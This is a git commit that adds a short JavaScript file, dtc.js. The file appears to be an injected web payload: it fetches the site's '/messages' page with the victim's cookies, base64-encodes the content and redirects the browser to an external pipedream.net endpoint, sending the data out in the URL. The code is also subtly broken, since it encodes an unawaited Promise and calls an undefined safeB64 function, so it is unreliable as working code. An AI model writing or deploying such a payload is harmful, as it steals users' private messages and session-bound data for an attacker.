97a39d71772867a9cda760cf999d9887c6293d77
skav75 <149662383+skav75@users.noreply.github.com>
2025-10-04 00:55:22 +0200

    Create dtc.js

---
+++ dtc.js
@@ -0,0 +1,13 @@
+(async function(){
+  const END = "https://eoeipamgnflz15n.m.pipedream.net";
+
+  const url = "/messages";
+  try {
+    const res = await fetch(url, { method: "GET", credentials: "include" });
+    const payload = await btoa(res.text())
+    document.location = END + "?p=" + payload;
+  } catch (err) {
+    const payload = encodeURIComponent(safeB64(String(err && err.stack ? err.stack : err)));
+    document.location = END + "?err=" + payload;
+  }
+})();
